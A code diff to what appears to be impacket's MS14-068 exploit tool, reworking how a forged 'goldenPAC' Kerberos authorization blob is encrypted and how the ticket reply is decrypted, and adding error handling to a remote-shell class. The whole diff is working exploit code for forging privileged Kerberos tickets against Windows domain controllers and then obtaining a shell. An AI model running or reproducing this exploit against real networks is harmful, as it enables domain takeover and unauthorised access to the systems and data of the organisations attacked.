@@ -568,7 +568,10 @@ class RemoteShell(cmd.Cmd):
         if s == '':
             print os.getcwd()
         else:
-            os.chdir(s)
+            try:
+                os.chdir(s)
+            except Exception, e:
+                print e 
         self.send_data('\r\n')
 
     def emptyline(self):
@@ -784,12 +787,11 @@ class MS14_068():
         ifRelevant[0]['ad-data'] = goldenPAC
 
         encodedIfRelevant = encoder.encode(ifRelevant)
-        subKey = Key(cipher.enctype,'A'*16)
 
-        # Key Usage 5
+        # Key Usage 4
         # TGS-REQ KDC-REQ-BODY AuthorizationData, encrypted with
-        # the TGS authenticator subkey (Section 5.4.1)
-        encryptedEncodedIfRelevant = cipher.encrypt(subKey, 5, encodedIfRelevant, None)
+        # the TGS session key (Section 5.4.1)
+        encryptedEncodedIfRelevant = cipher.encrypt(sessionKey, 4, encodedIfRelevant, None)
 
         tgsReq = TGS_REQ()
         reqBody = seq_set(tgsReq, 'req-body')
@@ -812,13 +814,6 @@ class MS14_068():
         reqBody['enc-authorization-data']['etype'] = int(constants.EncriptionTypes.rc4_hmac.value)
         reqBody['enc-authorization-data']['cipher'] = encryptedEncodedIfRelevant
 
-        from impacket.krb5 import asn1
-        # I don't really know why this is happening, same with marc
-        reqBody2 = reqBody.clone(tagSet=asn1.KDC_REQ_BODY.tagSet, cloneValueFlag=True)
-
-        #reqBodyChecksum = MD5.new(encoder.encode(reqBody)).digest()
-        reqBodyChecksum = MD5.new(encoder.encode(reqBody2)).digest()
-
         apReq = AP_REQ()
         apReq['pvno'] = 5
         apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
@@ -835,17 +830,10 @@ class MS14_068():
         clientName.from_asn1( decodedTGT, 'crealm', 'cname')
 
         seq_set(authenticator, 'cname', clientName.components_to_asn1)
-        authenticator['cksum'] = None
-        authenticator['cksum']['cksumtype'] = self.RSA_MD5
-        authenticator['cksum']['checksum'] = reqBodyChecksum
 
         now = datetime.datetime.utcnow() 
         authenticator['cusec'] =  now.microsecond
         authenticator['ctime'] = KerberosTime.to_asn1(now)
-
-        authenticator['subkey'] = None
-        authenticator['subkey']['keytype'] = constants.EncriptionTypes.rc4_hmac.value
-        authenticator['subkey']['keyvalue'] = 'A'*16
 
         encodedAuthenticator = encoder.encode(authenticator)
 
@@ -881,15 +869,14 @@ class MS14_068():
         r = sendReceive(message, domain, kdcHost)
 
         # Get the session key
-
         tgs = decoder.decode(r, asn1Spec = TGS_REP())[0]
         cipherText = tgs['enc-part']['cipher']
 
-        # Key Usage 9
-        # TGS-REP encrypted part (includes application session
-        # key), encrypted with the TGS authenticator subkey
-        # (Section 5.4.2)
-        plainText = cipher.decrypt(subKey, 9, str(cipherText))
+        # Key Usage 3
+        # AS-REP encrypted part (includes TGS session key or
+        # application session key), encrypted with the client key
+        # (Section 5.4.2)        
+        plainText = cipher.decrypt(sessionKey, 3, str(cipherText))
 
         encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
 
